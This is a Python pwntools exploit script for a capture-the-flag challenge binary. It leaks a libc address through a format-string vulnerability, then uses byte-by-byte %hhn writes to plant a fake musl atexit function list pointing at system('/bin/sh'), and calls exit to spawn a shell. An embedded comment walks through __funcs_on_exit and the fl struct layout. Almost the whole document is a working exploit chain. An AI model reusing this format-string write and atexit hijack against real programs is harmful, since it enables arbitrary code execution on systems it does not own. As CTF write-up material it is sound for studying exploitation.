#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path)

def fmt(payload):
    assert len(payload) <= 48
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'index:', b'0')
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', cyclic(0x20))
    io.sendlineafter(b'>>', b'2')
    io.sendlineafter(b'index:', b'0')
    io.sendlineafter(b'leave..', payload)
    io.recvline() ; io.recvline()

io = process()

"""
exit() function calls __funcs_on_exit as you can see in disas;

pwndbg> disas exit
Dump of assembler code for function exit:
   0x00007ffff7f51096 <+0>:     push   rbx
   0x00007ffff7f51097 <+1>:     mov    ebx,edi
   0x00007ffff7f51099 <+3>:     call   0x7ffff7f80b6d <__funcs_on_exit>
   0x00007ffff7f5109e <+8>:     call   0x7ffff7f776a0 <__libc_exit_fini>
   0x00007ffff7f510a3 <+13>:    xor    eax,eax
   0x00007ffff7f510a5 <+15>:    call   0x7ffff7fa1c38 <__stdio_exit_needed>
   0x00007ffff7f510aa <+20>:    mov    edi,ebx
   0x00007ffff7f510ac <+22>:    call   0x7ffff7f809e1 <_Exit>
End of assembler dump.

void __funcs_on_exit()
{
	void (*func)(void *), *arg;
	LOCK(lock);
	for (; head; head=head->next, slot=COUNT) while(slot-->0) {
		func = head->f[slot];
		arg = head->a[slot];
		UNLOCK(lock);
		func(arg);
		LOCK(lock);
	}
	/* Unlock to prevent deadlock if a global dtor
	 * attempts to call atexit. */
	finished_atexit = 1;
	UNLOCK(lock);
}

looking at the source code of __funcs_on_exit we can see that it walks a linked list backwards ...
head is of type fl which is defined as:

#define COUNT 32
static struct fl
{
	struct fl *next;
	void (*f[COUNT])(void *);
	void *a[COUNT];
} builtin, *head;

so, 
+0x00  -> ptr to the next node
+0x08  -> 1st function ptr
+0x10  -> 2nd function ptr
+0x18  -> 3rd function ptr
...SNIP...
+0x100 -> 32nd function ptr
...SNIP...
+0x108  -> 1st function argument
+0x110  -> 2nd function argument
+0x118  -> 3rd function argument
...SNIP...
+0x200 -> 32nd function argument

so, the __funcs_on_exit ... takes a node from the linked list while head != 0 ... doing head = head->next
and then taking the first function and it's argument and calling that and then second, third and so on

so, what we do is overwrite head to be non zero and point it to a fake fl struct
where we set the first function to system and argument to ptr to /bin/sh\x00

also we have to set slot to non-zero value i.e one
because the for-loop use a decremental operator so, it's X, X-1, X-2 ... X-N
it's zero by default so, if we don't set it to non-zero value the loop would never run :((

the source code says that it sets slot to 32 ... which it does ... but, not on the first node but on the second node ...
on the first run it's set to 0x20 by default
there are two ways ... either u provide the first node's next to itself and set the 32nd function and argument at +0x100, +0x200 respectively
or, you set the slot to 1 and set the first function and argument at +0x8 & +0x108
"""

fmt(b'%p.'*10) ; libc.address = int(io.recvline().strip().split(b'.')[5], 16) - 0xbe280

fake_fl_struct = libc.sym.head + 56
writes = {
    libc.sym.slot: 1,
    libc.sym.head: fake_fl_struct,
    fake_fl_struct + 8: libc.sym.system,
    fake_fl_struct + 0x108: next(libc.search(b'/bin/sh\x00')),
}

for addr, value in writes.items():
    for i in range(8):
        payload = b''
        payload += b'%*c' * 3 + b'%p' * 4
        payload += f'%{((value >> i*8) & 0xff) + 195}x'.encode()
        payload = payload.ljust((len(payload) + 7) // 8 * 8, b' ') + b'.%hhn.'
        payload = payload.ljust((len(payload) + 7) // 8 * 8, b' ') + p64(addr + i)
        fmt(payload)

io.sendlineafter(b'>>', b'3')
io.interactive()
